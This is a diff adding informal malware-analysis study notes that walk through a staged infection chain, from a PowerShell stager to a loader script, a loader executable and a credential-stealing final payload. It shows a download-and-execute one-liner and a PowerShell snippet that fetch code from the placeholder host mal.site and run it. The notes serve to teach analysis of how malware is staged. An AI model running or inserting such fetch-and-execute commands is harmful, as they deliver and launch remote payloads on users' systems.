@@ -1,0 +1,93 @@
+Stage - 0:
+  User Executes command
+powershell -c "iwr http://mal.site/1.ps1 | iex"
+
+so this command download 1.ps1 & Executes
+This is stager(Stage 0), Becz it brings next stage.
+
+Stage 1 --> 1.ps1 (You must open this)
+  Imagine you open 1.ps2
+
+$url = "http://mal.site/loader.exe"
+$out = "$env:TEMP\loader.exe"
+Invoke-WebRequest $url -OutFile $out
+Start-Process $out
+
+This is stage or Loader [ Becz it: downloads next stage & Executes]
+
+Stage 2 --> loader.exe
+As it is difficult to see .exe code, so, we analyze using behaviour of .exe via anyrun or event static analysis is possible
+
+Typical loader behavior:
+
+drop files
+decrypt payload
+extract archive
+inject into memory
+
+loader.exe downloads archive.zip
+loader.exe extracts payload.exe using 7zip
+
+Key understanding:
+
+👉 If a file:
+
+prepares environment
+extracts or decrypts
+launches hidden payload
+
+👉 Then it is a Loader
+
+Conclusion:
+loader.exe = Stage 2 (Loader)
+
+Stage 3 --> Extracted Payload:
+After extraction
+  Payload.exe
+
+Is this the final malware?”
+
+Check behavior (logically):
+
+connects to internet?
+steals data?
+creates persistence?
+injects into processes?
+
+payload.exe connects to attacker server
+payload.exe steals credentials
+
+Conclusion:
+
+👉 This is Final Payload
+
+Full Chain
+Command (Stage 0)
+   ↓
+1.ps1 (Stage 1)
+   ↓
+loader.exe (Stage 2)
+   ↓
+payload.exe (Final)
+
+How to Download:
+  If it downloads --> It's NOT Final
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
